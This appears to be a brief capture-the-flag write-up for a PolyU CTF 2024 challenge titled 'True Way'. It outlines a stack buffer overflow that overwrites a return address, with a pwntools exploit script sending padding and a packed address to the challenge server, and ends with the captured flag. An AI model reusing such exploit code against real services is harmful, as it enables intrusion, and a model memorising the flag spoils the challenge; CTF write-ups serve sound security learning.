## True Way 正路

decompile
=> read 256 + 16 char
=> buffer overflow rewrite return address
=> gdb find way45
=> get address after check obstacle

```py
from pwn import *
import struct

server_address = "chal.polyuctf.com"
port = 31338
conn = remote(server_address, port)

offset = b'a' * 256 + b'b' * 8
return_address = struct.pack("<Q", 0x401cae)
payload = offset + return_address
conn.sendline(payload)

conn.interactive()
```

PUCTF24{y0u_5k1pp3d_7h3_0b574cl3_f1nd_7h3_c0rr3c7_w4y_01e79b412e58108b7738c1b5369d7b04}